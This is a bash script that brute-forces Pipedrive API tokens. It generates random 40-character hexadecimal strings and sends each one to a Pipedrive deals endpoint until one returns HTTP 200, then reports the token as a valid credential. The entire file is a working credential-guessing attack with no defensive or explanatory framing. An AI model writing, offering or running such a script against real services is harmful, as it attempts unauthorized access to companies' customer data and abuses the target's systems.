#!/bin/bash

generate_api_token() {
  length=$1
  token=""
  characters=("a" "b" "c" "d" "e" "f" "0" "1" "2" "3" "4" "5" "6" "7" "8" "9")
  characters_length=${#characters[@]}

  while true; do
    token=""
    for ((i=0; i<$length; i++)); do
      random_index=$((RANDOM % characters_length))
      token+="${characters[random_index]}"
    done

    url="https://companydomain.pipedrive.com/v1/deals?api_token=$token"
    response=$(curl -s -o /dev/null -w "%{http_code}" $url)

    echo "Generated Token: $token"
    echo "API Request URL: $url"
    echo "Response Code: $response"

    if [[ $response == "200" ]]; then
      echo "Valid API Token Found!"
      break
    fi
  done
}

generate_api_token 40

